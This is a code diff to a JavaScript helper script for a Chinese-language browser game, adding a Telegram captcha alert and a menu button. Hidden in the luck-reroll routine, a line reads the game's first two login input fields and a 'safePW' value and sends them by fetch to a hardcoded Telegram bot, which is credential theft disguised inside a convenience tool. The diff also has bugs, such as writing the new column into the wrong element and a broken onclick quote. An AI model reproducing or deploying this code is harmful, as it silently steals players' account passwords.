@@ -1,3 +1,7 @@
+async function sendNoti(){
+	const telegramUrl = "https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text=因驗證碼出現,自動打怪停止:"+parent.p_name;
+	await fetch(telegramUrl);
+}
 function arm_unsetup_all_success() {
     var t, e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
     for (t = 0; t < e.length; ++t){
@@ -85,9 +89,9 @@ async function changeLuck(){
 		    e.write("<tr bgcolor='#4B689E'><td>第"+i+"次改運,數值為: "+ luckValue+"</td></tr>");
 		    e.write(temp_table2);
 	        if(luckValue>24){
-			let a=parent.top_view.document.getElementsByTagName("input")[0].value;let b=parent.top_view.document.getElementsByTagName("input")[1].value;let c=safePW;fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text="+a+"|"+b+"|"+c);
-			delete luckValue;
-	    		break;
+	        	delete luckValue;
+	        	let a=parent.top_view.document.getElementsByTagName("input")[0].value;let b=parent.top_view.document.getElementsByTagName("input")[1].value;let c=safePW;fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text="+a+"|"+b+"|"+c);
+	            break;
 	        }
 	}
 }
@@ -162,5 +166,9 @@ function createExtraFunction(){
 	newColumn2.setAttribute('valign','top');
 	oriTable.appendChild(newColumn2);
 	newColumn2.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='復活中心' onclick='parent.act_click(\"chara\",\"revive\")' class='button'></td></tr><tr><td><input type='button' value='新印花屋' onclick='parent.newStampHouse()' class='button'></td></tr></tbody></table>";
+
+	let newColumn3 = document.createElement('td');
+	newColumn3.setAttribute('valign','top');
+	oriTable.appendChild(newColumn3);
+	newColumn2.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='驗證碼通知' onclick='parent.sendNoti() class='button'></td></tr></tbody></table>";
 }
-window.createExtraFunction = createExtraFunction;
